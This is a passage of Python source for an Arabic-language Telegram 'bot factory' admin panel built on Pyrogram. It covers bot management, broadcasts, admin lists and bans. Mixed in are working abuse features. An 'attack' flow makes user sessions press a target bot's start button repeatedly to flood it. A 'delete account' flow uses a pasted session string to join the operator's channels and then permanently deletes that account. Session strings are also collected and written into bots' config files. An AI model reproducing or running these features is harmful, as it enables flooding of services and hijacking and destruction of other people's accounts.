                with open(f"Maked/{username}/groups.txt") as f: groups = len(f.readlines())
            if is_bot_running(username): status = "يعمل"
            res += f"<b>الحالة: {status}\nالبوت: {bot_link}</b>\nالمطور: {owner_name}\nالمستخدمون: {users}\nالمجموعات: {groups}\n\n"
        else: res += f"<b>{bot_link}</b> غير موجود\n\n"
    await _safe_edit(query, back_blocks("stats", res))

@Client.on_callback_query(filters.regex("^bots_stats$"))
async def cb_bots_stats(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "للمطورين فقط", alert=True)
    if not Bots: return await _safe_edit(query, back_blocks("stats", "لا يوجد بوتات"))
    active = inactive = total_users = total_groups = 0
    for bot in Bots:
        if not isinstance(bot, (list, tuple)) or len(bot) < 2: continue
        username = bot[0]
        if os.path.exists(f"Maked/{username}"):
            if is_bot_running(username): active += 1
            else: inactive += 1
            if os.path.exists(f"Maked/{username}/users.txt"):
                with open(f"Maked/{username}/users.txt") as f: total_users += len(f.readlines())
            if os.path.exists(f"Maked/{username}/groups.txt"):
                with open(f"Maked/{username}/groups.txt") as f: total_groups += len(f.readlines())
    stats = f"الإحصائيات:\n\nعدد البوتات: {len(Bots)}\nنشطة: {active}\nغير نشطة: {inactive}\nإجمالي المستخدمين: {total_users}\nإجمالي المجموعات: {total_groups}\n"
    await _safe_edit(query, back_blocks("stats", stats))

@Client.on_callback_query(filters.regex("^filter_bots$"))
async def cb_filter_bots(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    if not Bots: return await _safe_edit(query, back_blocks("stats", "لا يوجد بوتات"))
    blocks = [text_block("اختر معيار التصفية:"), btn_row([RBtn("1. بدون مستخدمين", "filter_1", ButtonStyle.PRIMARY)]), btn_row([RBtn("2. بدون مجموعات", "filter_2", ButtonStyle.PRIMARY)]), btn_row([RBtn("3. متوقفة", "filter_3", ButtonStyle.DANGER)]), btn_row([RBtn("4. مجموعات قليلة (<3)", "filter_4", ButtonStyle.PRIMARY)]), btn_row([RBtn("5. غير نشطة", "filter_5", ButtonStyle.DANGER)]), btn_row([RBtn("رجوع", "back_stats", ButtonStyle.DANGER)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex(r"^filter_([1-5])$"))
async def cb_filter_apply(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    choice, deleted = int(query.data.split("_")[1]), []
    for bot in Bots[:]:
        username, bot_path = bot[0], f"Maked/{bot[0]}"
        if not os.path.exists(bot_path):
            if choice == 5: Bots.remove(bot); deleted.append(f"هذا البوت: @{username} غير موجود")
            continue
        users = groups = 0; is_active = is_bot_running(username)
        if os.path.exists(f"{bot_path}/users.txt"):
            with open(f"{bot_path}/users.txt") as f: users = len(f.readlines())
        if os.path.exists(f"{bot_path}/groups.txt"):
            with open(f"{bot_path}/groups.txt") as f: groups = len(f.readlines())
        if (choice == 1 and users == 0) or (choice == 2 and groups == 0) or (choice == 3 and not is_active) or (choice == 4 and groups < 3) or (choice == 5 and (not is_active or users == 0 or groups == 0)):
            stop_bot_process(username); shutil.rmtree(bot_path, ignore_errors=True); Bots.remove(bot)
            deleted.append(f"<b>@{username} (المستخدمون: {users}, المجموعات: {groups})</b>")
    result = f"تم حذف {len(deleted)} بوت:\n\n" + "\n".join(deleted[:10])
    if len(deleted) > 10: result += f"\nو {len(deleted) - 10} بوتات أخرى..."
    await _safe_edit(query, back_blocks("stats", result))

async def get_session_info(s):
    try:
        c = Client(":memory:", session_string=s, in_memory=True); await c.start()
        m = await c.get_me()
        i = {"id": m.id, "first_name": m.first_name, "last_name": m.last_name or "", "username": f"@{m.username}" if m.username else "لا يوجد", "phone_number": m.phone_number or "غير متاح"}
        await c.stop(); return i
    except Exception as e: return {"error": str(e)}

@Client.on_callback_query(filters.regex("^change_session$"))
async def cb_change_session(client, query):
    uid = query.from_user.id; d = uid in SUDOS
    u = next((x[0] for x in Bots if int(x[1]) == uid), None)
    if not d and not u: return await _safe_edit(query, back_blocks("main", "ليس لديك بوت مسجل"))
    if d:
        set_state(uid, "change_session_bot", menu_message_id=query.message.id, is_sudo=True, fallback_bot=u)
        await _safe_edit(query, back_blocks("sessions", "<b>أرسل معرف البوت:</b>"))
    else:
        set_state(uid, "change_session_new", menu_message_id=query.message.id, bot=u)
        await _safe_edit(query, back_blocks("sessions", f"<b>جاري تغيير جلسة @{u}</b>\n\n<b>أرسل الجلسة الجديدة:</b>"))

@Client.on_callback_query(filters.regex("^start_attack$"))
async def cb_start_attack(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "attack_bot_username", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("sessions", "أرسل الآن معرف البوت مثال: @Bi1lieBot"))

@Client.on_callback_query(filters.regex("^delete_account$"))
async def cb_delete_account(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "delete_account_session", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("sessions", "<b>أرسل الآن جلسة الحساب الذي تريد حذفه</b>"))

@Client.on_callback_query(filters.regex(r"^confirm_"))
async def cb_confirm_delete_account(client, query):
    try:
        key, session_str = query.data.split("_", 1)[1], session_storage.get(query.data.split("_", 1)[1])
        if not session_str: return await safe_answer(query, "انتهت صلاحية الجلسة", alert=True)
        await _safe_edit(query, [text_block("جارٍ حذف الحساب...")])
        async with Client(name=":memory:", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as temp_client:
            joined_channels = []
            for channel in channels_one:
                try: await temp_client.join_chat(channel); joined_channels.append(channel); await asyncio.sleep(1)
                except: continue
            me = await temp_client.get_me(); username = me.username or "لا يوجد"
            await temp_client.invoke(functions.account.DeleteAccount(reason="By User Request"))
        if key in session_storage: del session_storage[key]
        channels_text = "\n".join([f"{channel}" for channel in joined_channels]) if joined_channels else "لم ينضم لأي قناة"
        await _safe_edit(query, back_blocks("sessions", f"تم حذف الحساب بنجاح\nمعرف الحساب: @{username}\nالقنوات:\n{channels_text}"))
    except Exception as e: await _safe_edit(query, back_blocks("sessions", f"فشل حذف الحساب: {str(e)}"))

@Client.on_callback_query(filters.regex(r"^cancel_"))
async def cb_cancel_delete_account(client, query):
    try:
        key = query.data.split("_", 1)[1]
        if key in session_storage: del session_storage[key]
        await _safe_edit(query, back_blocks("sessions", "تم إلغاء عملية الحذف"))
    except Exception as e: await safe_answer(query, f"حدث خطأ: {str(e)}", alert=True)

@Client.on_callback_query(filters.regex("^broadcast_normal$"))
async def cb_broadcast_normal(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    uid = query.from_user.id; r_set(f"{uid}{BROADCAST_TYPES['normal']}", "1"); clear_other_broadcasts(uid, "normal")
    set_state(uid, "awaiting_post", menu_message_id=query.message.id, broadcast_type="normal")
    await _safe_edit(query, back_blocks("broadcast", "<b>أرسل الإذاعة الآن</b>\n\nنص + ملف + متحركة + ملصق + صورة"))

@Client.on_callback_query(filters.regex("^broadcast_forward$"))
async def cb_broadcast_forward(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    uid = query.from_user.id; r_set(f"{uid}{BROADCAST_TYPES['forward']}", "1"); clear_other_broadcasts(uid, "forward")
    set_state(uid, "awaiting_post", menu_message_id=query.message.id, broadcast_type="forward")
    await _safe_edit(query, back_blocks("broadcast", "<b>أرسل الإذاعة الآن</b>\n\nنص + ملف + متحركة + ملصق + صورة"))

@Client.on_callback_query(filters.regex("^broadcast_pin$"))
async def cb_broadcast_pin(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    uid = query.from_user.id; r_set(f"{uid}{BROADCAST_TYPES['pin']}", "1"); clear_other_broadcasts(uid, "pin")
    set_state(uid, "awaiting_post", menu_message_id=query.message.id, broadcast_type="pin")
    await _safe_edit(query, back_blocks("broadcast", "<b>أرسل الإذاعة الآن</b>\n\nنص + ملف + متحركة + ملصق + صورة"))

@Client.on_callback_query(filters.regex("^promote_admin$"))
async def cb_promote_admin(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "promote_admin_user", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("admins", "<b>ارسل معرف المستخدم الان</b>"))

@Client.on_callback_query(filters.regex("^demote_admin$"))
async def cb_demote_admin(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص المطورين بس", alert=True)
    set_state(query.from_user.id, "demote_admin_user", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("admins", "ارسل معرف المستخدم الان"))

@Client.on_callback_query(filters.regex("^list_admins$"))
async def cb_list_admins(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    if not ADMINS: return await _safe_edit(query, back_blocks("admins", "لا يوجد ادمنيه في القائمة"))
    try:
        user_mentions = await asyncio.gather(*[client.get_users(user_id) for user_id in ADMINS])
        response = "<b><u>قائمة الأدمنيه:</u></b>\n"
        for i, user in enumerate(user_mentions, start=1): response += f"<b>{i}- {safe_mention(user)}</b>\n"
        response += f"\n<b>عدد الأدمنيه:</b> {len(ADMINS)}</b>"
        await _safe_edit(query, back_blocks("admins", response))
    except Exception as e: await _safe_edit(query, back_blocks("admins", f"حدث خطأ: {e}"))

@Client.on_callback_query(filters.regex("^ban_user$"))
async def cb_ban_user(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    set_state(query.from_user.id, "ban_user_target", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("admins", "ارسل معرف المستخدم الان"))

@Client.on_callback_query(filters.regex("^unban_user$"))
async def cb_unban_user(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    set_state(query.from_user.id, "unban_user_target", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("admins", "ارسل معرف الارنب الان"))

@Client.on_callback_query(filters.regex("^my_perms$"))
async def cb_my_perms(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    user_id = query.from_user.id
    role = "مطور فيجا" if user_id in SUDOS else "ادمن في المصانع" if user_id in ADMINS else "مستخدم عادي"
    await _safe_edit(query, back_blocks("admins", f"صلاحياتك: <b>{role}</b>"))

@Client.on_callback_query(filters.regex("^list_blocked$"))
async def cb_list_blocked(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    if not blocked: return await _safe_edit(query, back_blocks("admins", "لا يوجد محظوريين في فيجا"))
    user_mentions = [await client.get_users(user_id) for user_id in blocked]
    response = "<b><u>قائمة المحظورين من فيجا:</u></b>\n"
    for i, user in enumerate(user_mentions, start=1): response += f"<b>{i} - {safe_mention(user)}</b>\n"
    response += f"\n<b>عددهم :</b> {len(blocked)}</b>"
    await _safe_edit(query, back_blocks("admins", response))

@Client.on_callback_query(filters.regex("^clear_blocked$"))
async def cb_clear_blocked(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    if not blocked: return await _safe_edit(query, back_blocks("admins", "لا يوجد محظوريين في فيجا"))
    count = len(blocked); blocked.clear(); r_delete(f"blocked:{bot_id}")
    await _safe_edit(query, back_blocks("admins", f"تم مسح جميع المحظورين بنجاح وعددهم {count}"))

@Client.on_callback_query(filters.regex("^open_system$"))
async def cb_open_system(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    global OFF
    if OFF is False: return await _safe_edit(query, back_blocks("settings", "النظام مفتوح من قبل"))
    OFF = False; await _safe_edit(query, back_blocks("settings", "تم فتح النظام بنجاح"))

@Client.on_callback_query(filters.regex("^close_system$"))
async def cb_close_system(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    global OFF
    if OFF is True: return await _safe_edit(query, back_blocks("settings", "النظام مقفول من قبل"))
    OFF = True; await _safe_edit(query, back_blocks("settings", "تم قفل النظام بنجاح"))

@Client.on_callback_query(filters.regex("^update_system$"))
async def cb_update_system(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    blocks = [text_block("هل انت متاكد من تحديث فيجا"), btn_row([RBtn("تحديث", "confirm_update_system", ButtonStyle.SUCCESS), RBtn("إلغاء", "back_settings", ButtonStyle.DANGER)]), btn_row([RBtn("رجوع", "back_settings", ButtonStyle.DANGER)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex("^confirm_update_system$"))
async def cb_confirm_update_system(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "غير مصرح", alert=True)
    try:
        await _safe_edit(query, [text_block("جاري تحديث المصنع...")]); await asyncio.sleep(2)
        for bot in Bots[:]:
            Bots.remove(bot); username = bot[0]; redis_client.hdel(f"bots:{bot_id}", username)
            stop_bot_process(username); shutil.rmtree(f"Maked/{username}", ignore_errors=True)
        os.execle(sys.executable, sys.executable, "main.py", os.environ.copy())
    except Exception as e: await _safe_edit(query, back_blocks("settings", f"فشل تحديث المصنع: {e}"))

@Client.on_callback_query(filters.regex("^enable_comm$"))
async def cb_enable_comm(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    key = f"{query.from_user.id}:twasl:{bot_id}"
    if not r_exists(key): r_set(key, "1"); await _safe_edit(query, back_blocks("settings", "تم تفعيل التواصل"))
    else: await _safe_edit(query, back_blocks("settings", "التواصل مفعل من قبل"))

@Client.on_callback_query(filters.regex("^disable_comm$"))
async def cb_disable_comm(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    key = f"{query.from_user.id}:twasl:{bot_id}"
    if r_exists(key): r_delete(key); await _safe_edit(query, back_blocks("settings", "تم تعطيل التواصل"))
    else: await _safe_edit(query, back_blocks("settings", "التواصل غير مفعل"))

@Client.on_callback_query(filters.regex("^backup_users$"))
async def cb_backup_users(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    await _safe_edit(query, [text_block("يرجى الانتظار...")])
    await client.send_document(query.message.chat.id, users_backup())
    await _safe_edit(query, back_blocks("settings", "تم إرسال نسخة الأعضاء بنجاح"))
    if os.path.exists("users.txt"): os.remove("users.txt")

@Client.on_callback_query(filters.regex("^upload_users$"))
async def cb_upload_users(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    r_set(f"{query.from_user.id}:users_up:{bot_id}", "1")
    set_state(query.from_user.id, "awaiting_users_file", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("settings", "ارسل الان نسخه ملف الاعضاء ملف .txt"))

@Client.on_callback_query(filters.regex("^clear_storage$"))
async def cb_clear_storage(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    blocks = [text_block("<b>هل أنت متأكد من أنك تريد تفريغ جميع بيانات التخزين؟</b>"), btn_row([RBtn("تأكيد", "confirm_clear_storage", ButtonStyle.DANGER)]), btn_row([RBtn("إلغاء", "back_settings", ButtonStyle.SUCCESS)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex("^confirm_clear_storage$"))
async def cb_confirm_clear_storage(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "غير مصرح", alert=True)
    try:
        await safe_answer(query, "جاري تفريغ التخزين...", alert=False)
        keys_to_delete = redis_client.keys(f"*{bot_id}*")
        if keys_to_delete: redis_client.delete(*keys_to_delete)
        blocked.clear(); mk.clear(); Bots.clear(); ADMINS.clear()
        await client.send_message(query.message.chat.id, "<b>تم تفريغ جميع بيانات التخزين بنجاح\nتم مسح المستخدمين البوتات الأدمنية والمحظورين</b>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_settings")]]))
    except Exception as e: await client.send_message(query.message.chat.id, f"حدث خطأ أثناء التفريغ: {str(e)}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع", callback_data="back_settings")]]))

@Client.on_callback_query(filters.regex("^system_info$"))
async def cb_system_info(client, query):
    if query.from_user.id not in SUDOS and query.from_user.id not in ADMINS: return await safe_answer(query, "غير مصرح", alert=True)
    global OFF
    status = "معطل" if OFF else "مفعل"
    caption = f"══ {Channel_Name} ══\nالحالة: {status}\nالمستخدمين: {len(get_users())}\nالمطورين: {len(SUDOS)}\nالادمن: {len(ADMINS)}\nالمحظورين: {len(blocked)}\nالبوتات: {len(Bots)}\n══ {Channel_Name} ══"
    blocks = [text_block(caption), btn_row([RBtn(Channel_Name, url=f"https://t.me/{Channel}", style=ButtonStyle.PRIMARY)]), btn_row([RBtn("رجوع", "back_info", ButtonStyle.DANGER)])]
    await _safe_edit(query, blocks)

@Client.on_callback_query(filters.regex("^install_info$"))
async def cb_install_info(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    set_state(query.from_user.id, "install_info_bot", menu_message_id=query.message.id)
    await _safe_edit(query, back_blocks("info", "أرسل معرف البوت الذي تريد استخراج معلوماته:"))

@Client.on_callback_query(filters.regex("^server_info$"))
async def cb_server_info(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    try:
        i = subprocess.getoutput
        o = i("lsb_release -d").split(":")[1].strip(); u = i("uptime -p").strip(); h = i("hostname").strip()
        cm = i("cat /proc/cpuinfo | grep 'model name' | uniq").split(":")[1].strip(); cc = i("nproc").strip()
        cu = i("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'").strip()
        rt = i("free -h | grep 'Mem:' | awk '{print $2}'").strip(); ru = i("free -h | grep 'Mem:' | awk '{print $3}'").strip()
        rc = i("free -h | grep 'Mem:' | awk '{print $6}'").strip()
        dt = i("df -h / | awk 'NR==2 {print $2}'").strip(); du = i("df -h / | awk 'NR==2 {print $3}'").strip()
        ip = i("hostname -I | awk '{print $1}'").strip(); pub = i("curl -s ifconfig.me").strip()
        text = f"<b>── معلومات السيرفر ──</b>\n\n<b>المعلومات الأساسية:</b>\nالنظام: <code>{o}</code>\nاسم السيرفر: <code>{h}</code>\nمدة التشغيل: <code>{u}</code>\n\n<b>المعالج CPU:</b>\nالنموذج: <code>{cm}</code>\nالنوى: <code>{cc}</code>\nالاستخدام: <code>{cu}%</code>\n\n<b>الذاكرة RAM:</b>\nالإجمالي: <code>{rt}</code>\nالمستخدم: <code>{ru}</code>\nالكاش: <code>{rc}</code>\n\n<b>التخزين Disk:</b>\nالإجمالي: <code>{dt}</code>\nالمستخدم: <code>{du}</code>\n\n<b>الشبكة Network:</b>\nIP الداخلي: <code>{ip}</code>\nIP العام: <code>{pub}</code>"
        await _safe_edit(query, back_blocks("info", text))
    except Exception as e: await _safe_edit(query, back_blocks("info", f"<b>حدث خطأ:</b>\n<code>{str(e)}</code>"))

@Client.on_callback_query(filters.regex("^list_screens$"))
async def cb_list_screens(client, query):
    if query.from_user.id not in SUDOS: return await safe_answer(query, "هذا الامر يخص فيجا بس", alert=True)
    n = 0; response_message = "<b>── الاسكرينات المفتوحه من فيجا ──</b>\n\n"
    try:
        for screen in os.listdir("/var/run/screen/S-root"): n += 1; response_message += f"{n} - {screen}\n"
    except: response_message += "لا توجد اسكرينات\n"
    await _safe_edit(query, back_blocks("info", response_message))

@Client.on_callback_query(filters.regex("^apply_session_yes$"))
async def cb_apply_session(client, query):
    uid = query.from_user.id; data = user_data.get(uid, {}); b = data.get("bot"); ns = data.get("new_session")
    if not b or not ns: clear_state(uid); return await _safe_edit(query, back_blocks("sessions", "خطأ: لا توجد بيانات"))
    await _safe_edit(query, [text_block("جاري التطبيق...")]); fdir = f"Maked/{b}"
    if not os.path.exists(fdir): clear_state(uid); return await _safe_edit(query, back_blocks("sessions", "خطأ: لا يوجد بوت"))
    if is_bot_running(b): stop_bot_process(b); await asyncio.sleep(2)
    envp = f"{fdir}/.env"
    if os.path.exists(envp):
        with open(envp, 'r', encoding='utf-8') as f: ec = f.readlines()
        with open(envp, 'w', encoding='utf-8') as f: f.writelines([f'SESSION = {ns}\n' if l.startswith('SESSION =') else l for l in ec])
        start_bot_process(b); clear_state(uid); await _safe_edit(query, back_blocks("sessions", f"<b>تم تغيير جلسة @{b} بنجاح</b>"))
    else: clear_state(uid); await _safe_edit(query, back_blocks("sessions", "خطأ: لا يوجد .env"))

@bot.on_message(filters.text & filters.private, group=1)
async def handle_states(client, message):
    uid = message.from_user.id; state = get_state(uid)
    if not state: return
    
    global OFF
    if OFF and uid not in SUDOS and uid not in ADMINS and state in ["make_bot_token", "make_bot_session", "make_bot_owner"]:
        clear_state(uid)
        return await message.reply("الصانع مقفول حاليا يرجى التواصل مع المطور @TopVeGa")

    text = (message.text or "").strip(); chat_id = message.chat.id; menu_id = get_menu_msg_id(uid)
    async def em(blocks_or_text, kb=None):
        if menu_id:
            try:
                msg = await client.get_messages(chat_id, menu_id)
                fb_text, fb_kb = _blocks_to_kb_and_text(blocks_or_text) if isinstance(blocks_or_text, list) else (str(blocks_or_text), kb)
                if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                else: await msg.edit_text(fb_text, reply_markup=fb_kb, parse_mode=ParseMode.HTML)
                return
            except MessageNotModified: return
            except: pass
        try:
            if isinstance(blocks_or_text, list): await safe_send_rich(client, chat_id, blocks_or_text, reply_to=message.id)
            else: await message.reply(blocks_or_text, reply_markup=kb)
        except: pass
    if text in ["الغاء", "إلغاء", "رجوع"]:
        for broadcast_type in BROADCAST_TYPES.values(): r_delete(f"{uid}{broadcast_type}")
        r_delete(f"{uid}:users_up:{bot_id}"); clear_state(uid)
        is_admin = uid in SUDOS or uid in ADMINS
        return await em(main_menu_blocks(is_admin, message.from_user))
    if state == "make_bot_token":
        TOKEN = text
        if ':' not in TOKEN: return await em(back_blocks("bots", "<b>التوكن غير صالح أرسل توكن صحيح من @BotFather</b>"))
        temp_bot = Client("temp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        try:
            await temp_bot.start(); bot_info = await temp_bot.get_me(); await temp_bot.stop()
            if not bot_info: return await em(back_blocks("bots", "<b>فشل التحقق من التوكن</b>"))
        except Exception as e: return await em(back_blocks("bots", f"خطأ في التوكن: {e}"))
        set_state(uid, "make_bot_session", token=TOKEN, username=bot_info.username, bot_name=bot_info.first_name)
        return await em(back_blocks("bots", "<b>أرسل جلسة بيروجرام v2</b>"))
    if state == "make_bot_session":
        SESSION = text
        if SESSION.startswith('1') or "telethon" in SESSION.lower() or "pyrogrambot" in SESSION.lower() or "bot" in SESSION.lower(): return await em(back_blocks("bots", "<b>هذه الجلسة ليست جلسة Pyrogram v2 صالحة</b>"))
        temp_user = Client("temp_user", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        try:
            await temp_user.start(); user_info = await temp_user.get_me(); await temp_user.stop()
            if not user_info or user_info.is_bot: return await em(back_blocks("bots", "<b>جلسة غير صالحة</b>"))
        except Exception as e: return await em(back_blocks("bots", f"خطأ في الجلسة: {e}"))
        set_state(uid, "make_bot_owner", session=SESSION)
        if uid in SUDOS: return await em(back_blocks("bots", "أرسل ايدي المطور"))
        set_state(uid, "make_bot_finish", dev=uid)
        return await _finish_make_bot(client, message, uid)
    if state == "make_bot_owner":
        try: Dev = int(text)
        except: return await em(back_blocks("bots", "أرسل الايدي بشكل صحيح"))
        set_state(uid, "make_bot_finish", dev=Dev)
        return await _finish_make_bot(client, message, uid)
    if state == "delete_bot_username":
        bot = text.replace("@", "")
        if not any(x[0] == bot for x in Bots): clear_state(uid); return await em(back_blocks("bots", "تم حذف هذا البوت من قبل"))
        delete_bot_and_keys(bot); clear_state(uid); return await em(back_blocks("bots", f"<b>تم حذف البوت بنجاح : @{bot}</b>"))
    if state == "start_bot_username":
        bot_username = text.replace("@", "")
        if not bot_username: return await em(back_blocks("bots", "خطاء : لم يتم ارسال المعرف"))
        if is_bot_running(bot_username): clear_state(uid); return await em(back_blocks("bots", f"البوت @{bot_username} يعمل بالفعل"))
        if not os.path.exists(f"Maked/{bot_username}"): return await em(back_blocks("bots", "لا يوجد بوت بهذا الاسم"))
        start_bot_process(bot_username); clear_state(uid); return await em(back_blocks("bots", f"تم تشغيل البوت @{bot_username}"))
    if state == "stop_bot_username":
        bot_username = text.replace("@", "")
        if not bot_username: return await em(back_blocks("bots", "خطاء : لم يتم ارسال المعرف"))
        if is_bot_running(bot_username): stop_bot_process(bot_username); clear_state(uid); return await em(back_blocks("bots", f"تم إيقاف البوت @{bot_username}"))
        clear_state(uid); return await em(back_blocks("bots", f"البوت @{bot_username} لا يعمل بالفعل"))
    if state == "change_session_bot":
        bot_target = text.replace("@", "")
        if not bot_target: return await em(back_blocks("sessions", "خطأ"))
        set_state(uid, "change_session_new", bot=bot_target); return await em(back_blocks("sessions", "<b>أرسل الجلسة الجديدة:</b>"))
    if state == "change_session_new":
        ns = text; bot_target = user_data.get(uid, {}).get("bot")
        if not bot_target: clear_state(uid); return await em(back_blocks("sessions", "خطأ"))
        if menu_id:
            try:
                msg = await client.get_messages(chat_id, menu_id)
                if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption="▱▱▱▱▱▱▱▱▱▱ 0%")
                else: await msg.edit_text("▱▱▱▱▱▱▱▱▱▱ 0%")
                for i in range(10, 110, 10):
                    progress = f"{'▰' * (i//10)}{'▱' * (10 - (i//10))} {i}%"
                    if msg and (msg.caption is not None or msg.photo or msg.video): await msg.edit_caption(caption=progress)
                    else: await msg.edit_text(progress)
                    await asyncio.sleep(0.3)
            except: pass
        si = await get_session_info(ns)
        if "error" in si: clear_state(uid); return await em(back_blocks("sessions", f"<b>خطأ:</b>\n<code>{si['error']}</code>"))
        t = f"<b>معلومات الجلسة الجديدة:</b>\n\n<b>الاسم:</b> {si['first_name']} {si['last_name']}\n<b>المعرف:</b> {si['username']}\n<b>الآيدي:</b> <code>{si['id']}</code>\n<b>رقم الهاتف:</b> <code>{si['phone_number']}</code>\n\n<b>هل تريد التطبيق؟</b>"
        set_state(uid, "change_session_confirm", bot=bot_target, new_session=ns)
        return await em([text_block(t), btn_row([RBtn("تأكيد", "apply_session_yes", ButtonStyle.SUCCESS)]), btn_row([RBtn("إلغاء", "back_sessions", ButtonStyle.DANGER)])])
    if state == "attack_bot_username":
        bot_username = text.strip()
        if "https" in bot_username: bot_username = bot_username.replace("https://t.me/", "").replace("/", "")
        if not bot_username.startswith("@"): bot_username = f"@{bot_username}"
        set_state(uid, "attack_count", bot_username=bot_username)
        return await em(back_blocks("sessions", "كم مرة تريد الضغط على زر الاستارت لكل جلسة؟ أدخل رقما"))
    if state == "attack_count":
        try:
            press_count = int(text)
            if press_count <= 0: raise ValueError
        except: return await em(back_blocks("sessions", "يجب إدخال رقم صحيح موجب"))
        bot_username = user_data.get(uid, {}).get("bot_username"); clear_state(uid)
        return await _run_attack(client, message, uid, bot_username, press_count)
    if state == "delete_account_session":
        session_str = text.strip()
        try:
            async with Client(name=":temp:", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as temp_client:
                user_info = await temp_client.get_me(); full_name = f"{user_info.first_name or ''} {user_info.last_name or ''}".strip()
                username = f"@{user_info.username}" if user_info.username else "لا يوجد"; phone_number = user_info.phone_number or "غير متاح"
                key = f"{chat_id}_{message.id}"; session_storage[key] = session_str
                info_text = f"<b>معلومات الحساب المراد حذفه:</b>\n\n<b>الاسم:</b> {full_name}\n<b>المعرف:</b> {username}\n<b>الآيدي:</b> <code>{user_info.id}</code>\n<b>رقم الهاتف:</b> <code>{phone_number}</code>\n\nهل أنت متأكد من حذف هذا الحساب نهائيا؟"
                clear_state(uid)
                return await em([text_block(info_text), btn_row([RBtn("تأكيد الحذف", f"confirm_{key}", ButtonStyle.DANGER), RBtn("إلغاء", f"cancel_{key}", ButtonStyle.SUCCESS)]), btn_row([RBtn("رجوع", "back_sessions", ButtonStyle.DANGER)])])
        except Exception as e: clear_state(uid); return await em(back_blocks("sessions", f"حدث خطأ: {str(e)}"))
    if state == "awaiting_post":
        broadcast_type = user_data.get(uid, {}).get("broadcast_type", "normal"); clear_state(uid)
        return await _run_broadcast(client, message, uid, broadcast_type)
    if state == "promote_admin_user":
        user_input = text.replace("@", "")
        try:
            user = await client.get_chat(user_input); user_id = user.id
            if user_id in ADMINS: clear_state(uid); return await em(back_blocks("admins", "<b>المستخدم بالفعل ادمن</b>"))
            ADMINS.append(user_id); clear_state(uid); await em(back_blocks("admins", "<b>تم رفع المستخدم كادمن</b>"))
        except PeerIdInvalid: await em(back_blocks("admins", "تأكد من معرف المستخدم"))
        except Exception as e: await em(back_blocks("admins", f"حدث خطأ: {e}"))
        return
    if state == "demote_admin_user":
        user_input = text.replace("@", "")
        try:
            user = await client.get_chat(user_input); user_id = user.id
